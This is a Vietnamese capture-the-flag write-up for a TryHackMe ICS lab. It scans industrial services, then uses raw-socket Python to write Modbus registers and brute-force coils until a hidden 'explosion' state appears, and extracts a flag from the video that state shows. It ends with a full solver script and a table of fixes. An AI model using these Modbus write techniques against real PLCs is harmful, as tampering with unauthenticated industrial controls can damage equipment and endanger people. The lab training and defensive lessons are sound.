# PLC CCTV Simulator

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/kaboom |
| **Độ khó** | Medium |
| **Chủ đề** | ICS/SCADA, Modbus TCP, Siemens S7, OpenPLC, Video Forensics |
| **Ngày** | 28/06/2026 |

---

## Mô tả

Một môi trường ICS/SCADA thu nhỏ mô phỏng hệ thống giám sát nhà máy: camera CCTV hiển thị trạng thái PLC theo thời gian thực, OpenPLC Runtime điều khiển quá trình, và nhiều giao thức công nghiệp được mở ra ngoài. Challenge gồm 3 bước nối tiếp:

1. Trinh sát toàn diện → phát hiện 7 dịch vụ ICS chạy song song
2. Tương tác với Modbus TCP → đọc/ghi thanh ghi và cuộn để tìm coil ẩn → kích hoạt trạng thái "Explosion Detected!"
3. Tải video CCTV ứng với trạng thái nổ → trích xuất frame → đọc cờ

---

## Trinh sát

### Quét cổng

Quét nhanh các cổng thông dụng trước:

```bash
nmap -sV -T4 --open -p 21,22,80,443,502,1880,8080,8443,44818 10.48.163.74
```

Thấy 3 cổng ngay: 22, 80, 8080. Chạy full scan để không bỏ sót:

```bash
nmap -sV -sC -T4 --open -p- 10.48.163.74
```

| Cổng | Dịch vụ | Phiên bản / Ghi chú |
|------|---------|---------------------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Werkzeug/3.1.3 Python/3.12.3 — **PLC CCTV Simulator** |
| 102/tcp | iso-tsap | **Siemens S7 PLC** (SNAP7-SERVER, Module 6ES7 315-2EH14-0AB0) |
| 502/tcp | Modbus TCP | Giao thức điều khiển PLC thô |
| 1880/tcp | HTTP | **Node-RED** (OpenJS Foundation) |
| 8080/tcp | HTTP | Werkzeug/2.3.7 Python/3.12.3 — **OpenPLC Webserver** |
| 44818/tcp | EtherNet/IP | Giao thức công nghiệp Rockwell/ODVA |

Đây là một môi trường ICS đầy đủ: CCTV frontend, PLC runtime, và bốn giao thức công nghiệp lộ trực tiếp ra ngoài — bề mặt tấn công rộng.

---

### Khám phá dịch vụ

#### Cổng 80 — PLC CCTV Simulator

Truy cập `http://10.48.163.74/`:

- Trang chủ là giao diện CCTV giả lập nền đen, hiển thị video vòng trong khung tròn
- JavaScript tự động gọi `/api/state` mỗi 5 giây rồi dùng kết quả để quyết định video nào hiển thị

```javascript
async function getPLCVideo() {
    const res = await fetch('/api/state');
    return await res.json();
}

async function updateVideoLoop() {
    const state = await getPLCVideo();
    const { status, video } = state;
    statusElement.textContent = `Status: ${status}`;
    const newSrc = `/video?mode=${video}`;   // ← dùng trực tiếp để load video
    if (!videoElement.src.includes(newSrc)) {
        videoElement.src = newSrc;
    }
}
```

Kiểm tra `/api/state`:

```bash
curl http://10.48.163.74/api/state
```

```json
{
  "status": "Cooling OFF, Low Temperature",
  "video": "normal"
}
```

Cấu trúc rõ ràng: `video` field quyết định mode của endpoint `/video?mode=<giá_trị>`. Nếu thay đổi được dữ liệu mà `/api/state` đọc từ PLC, ta kiểm soát được video hiển thị.

Thử nhanh path traversal và SSRF trên `/video?mode=` — server trả về `default.mp4` cho tất cả mode không hợp lệ, không bị khai thác theo hướng này.

Endpoint duy nhất tồn tại trên cổng 80: `/api/state`, `/video`, `/static/`.

#### Cổng 8080 — OpenPLC Webserver

Truy cập `http://10.48.163.74:8080/` → redirect về `/login`.

```
Release: 2025-03-31
```

Form đăng nhập chuẩn của OpenPLC Runtime. Thử các credential mặc định (`openplc/openplc`, `admin/admin`, ...) — đều thất bại. Endpoint yêu cầu authentication, tạm gác lại.

Các route nội bộ (`/dashboard`, `/programs`, `/hardware`, `/monitoring`) đều redirect về `/login` khi chưa auth.

#### Cổng 1880 — Node-RED

Trang chủ tải được (HTML của Node-RED editor), nhưng API endpoints (`/flows`, `/nodes`, ...) trả về `Unauthorized`. Node-RED đã bật authentication — credential không đoán được ở bước này.

#### Cổng 502 — Modbus TCP

Không có giao diện web. Đây là giao thức nhị phân thuần túy. **Modbus TCP không có cơ chế xác thực** theo mặc định — bất kỳ client nào cũng có thể đọc/ghi thanh ghi và coil của PLC.

---

## Khai thác

### Bước 1 — Đọc dữ liệu PLC qua Modbus TCP

Dùng Python socket thuần để giao tiếp Modbus (không cần thư viện ngoài):

```python
import socket, struct

def modbus_request(ip, port, unit_id, func_code, start, count):
    """Gửi Modbus TCP request, trả về raw response bytes."""
    length = 6  # bytes sau MBAP header
    header = struct.pack('>HHHBB', 1, 0, length, unit_id, func_code)
    data   = struct.pack('>HH', start, count)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.send(header + data)
    resp = s.recv(2048)
    s.close()
    return resp

IP, PORT = '10.48.163.74', 502

# FC3: Read Holding Registers (0-9)
resp = modbus_request(IP, PORT, 1, 3, 0, 10)
if resp[7] == 3:
    byte_count = resp[8]
    values = struct.unpack('>' + 'H'*(byte_count//2), resp[9:9+byte_count])
    for i, v in enumerate(values):
        if v:
            print(f'Reg[{i}] = {v}')
# → Reg[0] = <giá trị nhiệt độ hiện tại>

# FC1: Read Coils (0-19)
resp = modbus_request(IP, PORT, 1, 1, 0, 20)
# → tất cả đều OFF
```

`Reg[0]` chứa giá trị nhiệt độ động (thay đổi theo thời gian thực từ chương trình PLC). Tất cả coils đang OFF.

### Bước 2 — Ghi thanh ghi để thay đổi trạng thái CCTV

Thử ghi giá trị cao vào `Reg[0]` (FC6 — Write Single Register):

```python
def modbus_write_register(ip, port, unit_id, reg_addr, value):
    """FC6: Write Single Holding Register."""
    length = 6
    header = struct.pack('>HHHBB', 1, 0, length, unit_id, 6)
    data   = struct.pack('>HH', reg_addr, value)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.send(header + data)
    resp = s.recv(1024)
    s.close()
    return resp

import urllib.request, time

modbus_write_register(IP, PORT, 1, 0, 9999)
time.sleep(0.5)
state = urllib.request.urlopen('http://10.48.163.74/api/state', timeout=5).read()
print(state)
# → {"status": "High Temperature, Cooling ON", "video": "cooling"}
```

Ghi thanh ghi nhiệt độ với giá trị cao → `/api/state` phản ánh ngay trạng thái mới. Điều này xác nhận: **CCTV đọc trực tiếp từ Modbus, và Modbus không có xác thực** — ta hoàn toàn kiểm soát dữ liệu PLC hiển thị ra ngoài.

Tìm được 3 trạng thái:

| Reg[0] | status | video |
|--------|--------|-------|
| 0 | Unknown State | default |
| 10–80 | Cooling OFF, Low Temperature | normal |
| ≥ 85 | High Temperature, Cooling ON | cooling |

Nhưng không có cờ nào trong 3 trạng thái này. Cần tìm thêm.

### Bước 3 — Dò coil để tìm trạng thái ẩn

Ngoài holding registers (lưu giá trị số), Modbus còn có **coils** — bit flag điều khiển thiết bị ON/OFF. Thử kích hoạt từng coil và xem `/api/state` thay đổi thế nào:

```python
def modbus_write_coil(ip, port, unit_id, coil_addr, on):
    """FC5: Write Single Coil. on=True → FF00, on=False → 0000."""
    val    = 0xFF00 if on else 0x0000
    length = 6
    header = struct.pack('>HHHBB', 1, 0, length, unit_id, 5)
    data   = struct.pack('>HH', coil_addr, val)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.send(header + data)
    resp = s.recv(1024)
    s.close()
    return resp

seen = set()
for coil in range(20):
    modbus_write_coil(IP, PORT, 1, coil, True)
    time.sleep(0.3)
    raw   = urllib.request.urlopen('http://10.48.163.74/api/state', timeout=5).read()
    state = raw.decode().strip()
    modbus_write_coil(IP, PORT, 1, coil, False)   # reset về OFF
    if state not in seen:
        seen.add(state)
        print(f'Coil[{coil}] ON → {state}')
```

Kết quả nổi bật:

```
Coil[10] ON → {
  "status": "Explosion Detected!",
  "video": "explodedflag23"
}
```

**Coil 10** kích hoạt trạng thái không có trong tài liệu: *"Explosion Detected!"* — và video mode là `explodedflag23`.

### Bước 4 — Tải video và trích xuất cờ

Khi coil 10 đang ON, CCTV sẽ tải video ứng với mode `explodedflag23`:

```bash
curl -s "http://10.48.163.74/video?mode=explodedflag23" -o exploded.mp4
```

File trả về là MP4 hợp lệ, kích thước ~1.4 MB, thời lượng 5 giây — video cảnh nổ tại nhà máy.

Dùng OpenCV để trích xuất frame và đọc cờ:

```python
import cv2

cap = cv2.VideoCapture('exploded.mp4')
total = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
fps   = cap.get(cv2.CAP_PROP_FPS)
print(f'{total} frames @ {fps:.1f} fps ({total/fps:.1f}s)')

# Trích frame ở giây thứ ~1.25 — cờ xuất hiện rõ nhất
cap.set(cv2.CAP_PROP_POS_FRAMES, 30)
ret, frame = cap.read()
if ret:
    cv2.imwrite('flag_frame.jpg', frame)

cap.release()
```

Frame xuất ra hiển thị cờ dạng chữ đỏ trên nền cảnh nổ:

![Flag frame](images/flag_frame.jpg)

---

### Script hoàn chỉnh

```python
#!/usr/bin/env python3
"""
PLC CCTV Simulator — TryHackMe challenge solver
Yêu cầu: pip install opencv-python
"""
import socket, struct, time, urllib.request, cv2

TARGET_IP  = '10.48.163.74'
MODBUS_PORT = 502
CCTV_BASE  = f'http://{TARGET_IP}'

# ─── Helpers Modbus ───────────────────────────────────────────────────────────

def _modbus_send(ip, port, unit, fc, payload):
    length = 2 + len(payload)
    header = struct.pack('>HHHBB', 1, 0, length, unit, fc)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.send(header + payload)
    resp = s.recv(2048)
    s.close()
    return resp

def read_registers(start, count, unit=1):
    """FC3: Read Holding Registers."""
    resp = _modbus_send(TARGET_IP, MODBUS_PORT, unit, 3,
                        struct.pack('>HH', start, count))
    if resp[7] != 3:
        return []
    n = resp[8] // 2
    return list(struct.unpack('>' + 'H'*n, resp[9:9 + resp[8]]))

def write_register(addr, value, unit=1):
    """FC6: Write Single Holding Register."""
    _modbus_send(TARGET_IP, MODBUS_PORT, unit, 6,
                 struct.pack('>HH', addr, value))

def write_coil(addr, on, unit=1):
    """FC5: Write Single Coil."""
    val = 0xFF00 if on else 0x0000
    _modbus_send(TARGET_IP, MODBUS_PORT, unit, 5,
                 struct.pack('>HH', addr, val))

def get_cctv_state():
    """Lấy trạng thái CCTV hiện tại qua /api/state."""
    req  = urllib.request.urlopen(f'{CCTV_BASE}/api/state', timeout=5)
    import json
    return json.loads(req.read())

# ─── Bước 1: Xác nhận Modbus hoạt động ───────────────────────────────────────

regs = read_registers(0, 10)
print(f'[*] Holding registers: {regs}')
state = get_cctv_state()
print(f'[*] Trạng thái CCTV ban đầu: {state}')

# ─── Bước 2: Dò coil ẩn ──────────────────────────────────────────────────────

print('\n[*] Dò Modbus coils (0–19)...')
explosion_coil = None
seen = set()

for coil in range(20):
    write_coil(coil, True)
    time.sleep(0.3)
    s = get_cctv_state()
    write_coil(coil, False)

    key = s['video']
    if key not in seen:
        seen.add(key)
        print(f'  Coil[{coil}] ON → status="{s["status"]}" video="{s["video"]}"')

    if 'flag' in s['video'].lower() or s['status'] == 'Explosion Detected!':
        explosion_coil = coil
        explosion_video = s['video']
        print(f'\n[+] Tìm thấy trạng thái đặc biệt: Coil[{coil}]')
        print(f'    status : {s["status"]}')
        print(f'    video  : {s["video"]}')

if explosion_coil is None:
    raise SystemExit('[-] Không tìm thấy coil kích hoạt trạng thái nổ')

# ─── Bước 3: Tải video và trích xuất cờ ──────────────────────────────────────

write_coil(explosion_coil, True)   # đảm bảo trạng thái đang active
time.sleep(0.5)

url      = f'{CCTV_BASE}/video?mode={explosion_video}'
out_mp4  = 'exploded.mp4'
out_jpg  = 'flag_frame.jpg'

print(f'\n[*] Tải video từ {url}')
urllib.request.urlretrieve(url, out_mp4)
print(f'[+] Lưu tại: {out_mp4}')

cap   = cv2.VideoCapture(out_mp4)
total = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
fps   = cap.get(cv2.CAP_PROP_FPS)
print(f'[*] Video: {total} frames @ {fps:.1f} fps ({total/fps:.1f}s)')

# Cờ xuất hiện từ frame đầu, rõ nhất ở khoảng giây 1.0–2.0
cap.set(cv2.CAP_PROP_POS_FRAMES, 30)
ret, frame = cap.read()
if ret:
    cv2.imwrite(out_jpg, frame)
    print(f'[+] Frame lưu tại: {out_jpg} — đọc cờ từ ảnh này')
cap.release()

write_coil(explosion_coil, False)  # reset coil về OFF
print('\n[*] Hoàn tất. Mở flag_frame.jpg để xem cờ.')
```

---

## Cờ

> Giá trị thực không được ghi vào write-up.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Flag | Overlay chữ đỏ trong video `explodedflag23.mp4` | Kích hoạt Modbus Coil[10] → tải `/video?mode=explodedflag23` → trích frame bằng OpenCV |

---

## Bài học

| Lỗ hổng | Gốc rễ | Cách fix |
|---------|--------|----------|
| Modbus TCP không xác thực | Giao thức Modbus được thiết kế cho mạng nội bộ kín, không có auth header | Đặt PLC sau firewall công nghiệp; dùng Modbus Secure (TLS) hoặc gateway có xác thực |
| Coil/register PLC lộ ra internet | Port 502 bind trực tiếp ra `0.0.0.0` không qua DMZ | Chỉ bind Modbus trên interface nội bộ; dùng VPN hoặc jump host cho truy cập từ xa |
| Siemens S7 không xác thực (port 102) | SNAP7 mặc định không yêu cầu password ở S7comm level | Bật S7 connection password (S7-300/400 có cơ chế này); cập nhật lên S7-1200/1500 với TIA Portal security |
| Node-RED lộ ra internet | Port 1880 accessible từ ngoài, admin panel rộng quyền | Node-RED chỉ bind `127.0.0.1`; đặt sau reverse proxy có auth mạnh |
| OpenPLC Webserver public | Port 8080 lộ giao diện quản lý PLC; kẻ tấn công có credential có thể upload code PLC độc hại | Bind cổng quản lý vào `127.0.0.1`; require MFA; network segment riêng |
| CCTV trust dữ liệu Modbus không validate | `/api/state` đọc thẳng Modbus register, không có allowlist trạng thái hợp lệ | Validate giá trị PLC trước khi hiển thị; dùng allowlist trạng thái; không để logic nghiệp vụ phụ thuộc vào dữ liệu công nghiệp chưa kiểm tra |
| EtherNet/IP lộ ra internet (port 44818) | Giao thức ODVA không có auth tích hợp | Tương tự Modbus — firewall strict, chỉ allow subnet OT nội bộ |
